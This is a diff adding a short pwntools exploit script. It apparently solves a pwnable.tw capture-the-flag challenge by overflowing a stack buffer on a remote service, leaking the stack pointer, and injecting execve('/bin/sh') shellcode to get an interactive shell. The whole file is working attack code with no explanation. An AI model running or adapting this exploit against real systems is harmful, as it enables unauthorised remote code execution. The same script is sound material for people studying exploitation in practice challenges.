@@ -1,0 +1,12 @@
+from pwn import *
+io=remote("chall.pwnable.tw",10000)
+io.recvuntil(":")
+a="a"*20+p32(0x8048087)
+shellcode="\xEB\x0B\x31\xC0\x31\xC9\x31\xD2\xB0\x0B\x5B\xCD\x80\xE8\xF0\xFF\xFF\xFF/bin/sh\0x00"
+io.send(a)
+esp=io.recv(4)
+esp=u32(esp)
+shell="a"*20+p32(esp+0x14)+shellcode
+io.sendline(shell)
+io.interactive()
+
